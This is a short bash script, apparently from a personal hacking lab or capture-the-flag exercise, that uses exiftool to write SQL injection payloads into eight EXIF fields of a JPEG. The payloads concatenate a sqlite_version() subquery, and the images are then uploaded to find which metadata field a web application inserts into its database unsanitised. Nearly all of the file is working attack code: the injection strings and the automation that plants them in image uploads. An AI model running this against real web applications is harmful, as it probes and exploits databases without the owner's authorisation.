#!/bin/bash
# field_sweep.sh — the V1 vector (Make) is patched in V2. Category is SQLi, so another EXIF
# field is injectable. Write the sqlite_version() probe into EACH candidate field with exiftool,
# upload, and see which one EXECUTES (make/model/datetime/etc shows 3.xx instead of literal).
EXIFTOOL="/c/Users/Usuario/Documents/GonzaOrban/HackLab/exiftool/exiftool.exe"
BASE_IMG="paisaje_conv.jpg"

# payload that, if executed, returns the sqlite version -> unmistakable signal
P="',(SELECT sqlite_version()))--"
PIPE="'||(SELECT sqlite_version())||'"

writefield() {
  # writefield <exiftoolTag> <payload> <outmarker>
  cp "$BASE_IMG" f_$3.jpg
  "$EXIFTOOL" -overwrite_original "-$1=$2" f_$3.jpg >/dev/null 2>&1
  echo "wrote $1 into f_$3.jpg -> $("$EXIFTOOL" -s3 -$1 f_$3.jpg)"
}

# Fields that plausibly reach the INSERT. Try both concat styles per field.
writefield Model          "$PIPE"  model
writefield Software       "$PIPE"  software
writefield DateTimeOriginal "2025:01:01 00:00:00" datetime_ok
writefield ImageDescription "$PIPE" imgdesc
writefield Artist         "$PIPE"  artist
writefield UserComment    "$PIPE"  usercomment
writefield GPSLatitude    "$PIPE"  gpslat
writefield XPComment      "$PIPE"  xpcomment

echo
echo "Now upload all with: python upload_sweep.py"
